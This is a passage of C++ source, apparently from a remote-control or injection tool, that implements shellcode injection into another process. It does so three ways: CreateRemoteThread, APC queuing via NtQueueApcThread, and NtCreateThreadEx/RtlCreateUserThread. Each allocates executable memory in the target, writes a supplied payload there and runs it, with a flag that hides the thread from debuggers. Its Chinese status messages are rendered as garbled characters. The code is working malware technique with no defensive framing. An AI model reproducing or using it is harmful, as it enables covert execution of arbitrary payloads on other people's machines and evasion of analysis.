			((pfnNtCreateThreadEx)pFunc)(&hThread, 0x1FFFFF, NULL, hProc, pCode, pThreadData, THREAD_CREATE_FLAGS_CREATE_SUSPENDED | THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH | THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER , NULL, NULL, NULL, NULL);
			if (hThread == NULL)
				SendError(_T("ע��ʧ��"));
			else
				SendError(_T("ע��ɹ�"));

		}
		break;

		default:
			break;
		}
		CloseHandle(hProc);

	}
	break;
	case 3: 
	case 4: 
	case 5: 
	{
		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
		if (hProc == NULL)
		{
			SendError(_T("�򿪽���ʧ��"));
			return;
		}
		switch (mode)
		{
			
		case 3: //CreateRemoteThread(shellcode ע��)
		{
#ifdef _WIN64
			LPVOID RemotlpAddress = VirtualAllocEx(hProc, NULL, datasize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			WriteProcessMemory(hProc, RemotlpAddress, data, datasize, NULL);
			HANDLE	ThreadShellCode = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)RemotlpAddress, NULL, 0, NULL);
#else
			DWORD64 RemotlpAddress = yapi::VirtualAllocEx64(hProc, NULL, (SIZE_T)datasize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			yapi::WriteProcessMemory64(hProc, RemotlpAddress, data, datasize, NULL);
			HANDLE	ThreadShellCode = yapi::CreateRemoteThread64(hProc, NULL, 0, RemotlpAddress, NULL, 0, NULL);
#endif
			if (ThreadShellCode)		CloseHandle(ThreadShellCode);
			SendError(_T("ע��shellcode�ɹ�"));
		}
		break;
		case 4: //QueueUserAPC(shellcode ע��)
		{
			FARPROC fpAddresses[5] = {
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtAllocateVirtualMemory"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtWriteVirtualMemory"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtSuspendThread"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtAlertResumeThread"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtQueueApcThread")
			};
			pNtAllocateVirtualMemory fNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)fpAddresses[0];
			pNtWriteVirtualMemory fNtWriteVirtualMemory = (pNtWriteVirtualMemory)fpAddresses[1];
			pNtSuspendThread fNtSuspendThread = (pNtSuspendThread)fpAddresses[2];
			pNtAlertResumeThread fNtAlertResumeThread = (pNtAlertResumeThread)fpAddresses[3];
			pNtQueueApcThread fNtQueueApcThread = (pNtQueueApcThread)fpAddresses[4];
			HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
			THREADENTRY32 te32;
			hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
			if (hThreadSnap == INVALID_HANDLE_VALUE) {
				SendError(_T("�޷���ȡ�߳̿���"));
				break;
			}
			te32.dwSize = sizeof(THREADENTRY32);
			DWORD threadId;
			if (!Thread32First(hThreadSnap, &te32)) {
				SendError(_T("�޷���õ�һ���߳�"));
				break;
			}
			do {
				if (te32.th32OwnerProcessID == dwProcessID) {
					threadId = te32.th32ThreadID;
					HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
					if (hThread) {
						//#ifdef _WIN64
						LPVOID RemotlpAddress = VirtualAllocEx(hProc, NULL, datasize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						WriteProcessMemory(hProc, RemotlpAddress, data, datasize, NULL);
						//#else
						//					DWORD64 RemotlpAddress = yapi::VirtualAllocEx64(hProc, NULL, (SIZE_T)dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						//					yapi::WriteProcessMemory64(hProc, RemotlpAddress, lpAddress, dwSize, NULL);
						//#endif
						pNtSuspendThread NtSuspendThread = NULL;
						if (fNtSuspendThread)
						{
							ULONG SuspendCount = 0;
							fNtSuspendThread(hThread, &SuspendCount);
						}
						DWORD dwResult = fNtQueueApcThread(hThread, (PIO_APC_ROUTINE)RemotlpAddress, NULL, NULL, NULL);
						if (fNtAlertResumeThread)
						{
							ULONG SuspendCount = 0;
							fNtAlertResumeThread(hThread, &SuspendCount);
						}
						if (dwResult) {
							SendError(_T("��Ч�غ����߳��гɹ�ע��"));
							break;;
						}
						else
						{
							SendError(_T("���ô���QueueUSerAPC().�������������߳�"));
							continue;
						}
					}
					else {
						SendError(_T("��ȡ�ҵ����߳� ID ʱ����"));
						break;;
					}
				}
			} while (Thread32Next(hThreadSnap, &te32));

			if (!threadId)
				SendError(_T("û���߳����ڽ���"));
			CloseHandle(hThreadSnap);
		}
		break;
		case 5: //NtCreateThreadEx(shellcode ע��)
		{

#ifdef _WIN64
			LPVOID RemotlpAddress = VirtualAllocEx(hProc, NULL, datasize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			WriteProcessMemory(hProc, RemotlpAddress, data, datasize, NULL);
			pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtCreateThreadEx");
			if (NtCreateThreadEx == NULL) break;
			HANDLE ThreadShellCode = NULL;
			NtCreateThreadEx(&ThreadShellCode, /*0x1FFFFF*/THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)RemotlpAddress, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED | THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH | THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER , NULL, NULL, NULL, NULL);
			if (ThreadShellCode == NULL) break;
#else
			DWORD64 RemotlpAddress = yapi::VirtualAllocEx64(hProc, NULL, (SIZE_T)datasize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			yapi::WriteProcessMemory64(hProc, RemotlpAddress, data, datasize, NULL);
			yapi::X64Call RtlCreateUserThread("RtlCreateUserThread");
			HANDLE ThreadShellCode = NULL;
			RtlCreateUserThread(&ThreadShellCode, /*0x1FFFFF*/THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)RemotlpAddress, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED | THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH | THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER , NULL, NULL, NULL, NULL);
			if (ThreadShellCode == NULL) break;

#endif
			if (ThreadShellCode)		CloseHandle(ThreadShellCode);
			SendError(_T("ע��shellcode�ɹ�"));
		}
		break;

		default:
			break;
		}
		CloseHandle(hProc);
	}
	break;
	default:
		break;
	}





}























